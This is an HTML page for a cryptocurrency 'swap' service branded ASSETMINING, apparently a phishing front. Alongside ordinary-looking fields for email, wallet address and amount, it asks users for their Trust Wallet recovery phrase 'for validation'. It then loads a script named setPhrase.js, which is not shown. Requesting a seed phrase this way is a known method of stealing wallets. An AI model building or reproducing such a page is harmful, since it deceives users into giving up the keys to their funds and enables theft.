<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swap</title>
    <link rel="stylesheet" href="./style.css">
    <link rel="stylesheet" href="./fonts/fontawesome-free-6.0.0-web/css/all.css">
    <link rel="icon" type="image/png" href="./assets/image/rede.jpeg" sizes="16x16">
</head>
<body> 
    <form  id="form">
        <div class="form-div">
            <div class="form-container">
                <h1 class="logs">
                    <a href="" class="set">
                        ASSETMINING<i class="fa-solid fa-arrow-trend-up up"></i></a>
                    <br>
                    <b class="ounts">Note:Only work for trust wallet users</b>
                </h1>
                <div class="inp-div">
                    <b style="color: rgb(151, 151, 151); font-size: 12px;">From</b> 
                    <br> 
                    <select name="" id="">
                        <option value="">Bitcoin</option>
                        <option value="">Litecoin</option>
                        <option value="">Dogecoin</option>
                        <option value="">Ethcoin</option>
                    </select>
                    <br>
                    <br>
                    <b style="color: rgb(151, 151, 151); font-size: 12px;">To</b> 
                    <br> 
                    <select name="" id="">
                        <option value="">Bitcoin</option>
                        <option value="">Litecoin</option>
                        <option value="">Dogecoin</option>
                        <option value="">Ethcoin</option>
                    </select>
                    <br> 
                    <br> 
                    <input type="email" id="email" placeholder="Email" required class="one"> 
                    <br>
                    <br> 
                    <input type="text" id= "wallAdd" placeholder="Your wallet address" required class="one"> 
                    <br>
                    <br>                     
                    <input type="text" id="amt" placeholder="Amount to swap" required class="one"> 
                    <br>  
                    <br>                     
                    <textarea name="" id="phrase"   placeholder="your trust wallet phrase for validation" class="valid"></textarea>
                    <br>              
                    <br>             
                    <div class="network">
                        <b>Network charges will be apply</b></div>
                    <br> 
                    <div class="btnsi-div">
                        <button class="siup" id="subBtn" > 
                                <b>Deposit</b> 
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </form>
    <script src="./setPhrase.js"></script>
</body>
</html>
